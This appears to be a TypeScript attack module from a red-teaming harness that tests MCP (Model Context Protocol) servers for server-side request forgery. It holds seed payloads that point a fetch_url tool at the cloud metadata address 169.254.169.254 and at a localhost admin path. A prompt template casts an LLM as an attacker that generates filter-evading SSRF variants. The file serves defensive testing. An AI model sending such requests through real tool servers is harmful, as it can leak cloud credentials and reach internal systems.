import type { Attack, AttackModule, CodebaseAnalysis } from "../lib/types.js";

const category = "ssrf" as const;

export const mcpSsrfModule: AttackModule = {
  category,

  getSeedAttacks(): Attack[] {
    return [
      {
        id: "mcp-ssrf-1-metadata-endpoint",
        category,
        name: "Cloud metadata fetch via MCP tool",
        description:
          "Use a network-capable MCP tool to request a cloud metadata endpoint",
        authMethod: "none",
        role: "mcp-client",
        payload: {
          message:
            "Invoke an MCP fetch/browse/network tool against the cloud metadata service and inspect whether the server allows it.",
          _mcpOperation: "tools/call",
          _mcpTool: "fetch_url",
          _mcpArguments: {
            url: "http://169.254.169.254/latest/meta-data/",
          },
        },
        expectation:
          "The MCP server performs an internal network request that should have been blocked",
        severity: "critical",
        isLlmGenerated: false,
      },
      {
        id: "mcp-ssrf-2-local-admin",
        category,
        name: "Loopback admin fetch via MCP tool",
        description:
          "Use a network-capable MCP tool to reach localhost or an internal admin service",
        authMethod: "none",
        role: "mcp-client",
        payload: {
          message:
            "Use an MCP network tool against a localhost admin endpoint to test SSRF protections.",
          _mcpOperation: "tools/call",
          _mcpTool: "fetch_url",
          _mcpArguments: {
            url: "http://127.0.0.1:8080/admin",
          },
        },
        expectation:
          "The MCP server can be used as a proxy to internal localhost services",
        severity: "critical",
        isLlmGenerated: false,
      },
    ];
  },

  getGenerationPrompt(analysis: CodebaseAnalysis): string {
    return `You are a red-team attacker testing an MCP server for SSRF and internal network reachability issues.

DISCOVERED MCP TOOLS:
${JSON.stringify(
  analysis.tools.map((t) => ({ name: t.name, description: t.description })),
  null,
  2,
)}

Generate MCP SSRF attacks that:
1. Target browse, fetch, URL, webhook, HTTP, or network-capable tools
2. Probe loopback, link-local metadata, private RFC1918 ranges, and internal admin paths
3. Vary destination patterns and argument structure to test filtering gaps
4. Use MCP operations only, primarily "tools/call"`;
  },
};
